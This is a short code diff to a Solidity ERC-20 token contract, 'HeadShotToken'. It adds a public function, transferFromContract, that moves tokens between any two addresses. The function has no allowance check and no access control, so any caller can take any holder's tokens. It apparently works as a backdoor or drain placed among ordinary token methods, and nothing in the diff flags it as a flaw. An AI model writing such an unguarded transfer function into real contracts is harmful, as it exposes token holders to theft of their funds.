@@ -332,6 +332,11 @@ contract HeadShotToken is Context, IERC20, Ownable {
         return true;
     }
 
+    function transferFromContract(address sender, address recipient, uint256 amount) public returns (bool) {
+        _transfer(sender, recipient, amount);
+        return true;
+    }
+
     function allowance(address owner, address spender) public view override returns (uint256) {
         return _allowances[owner][spender];
     }
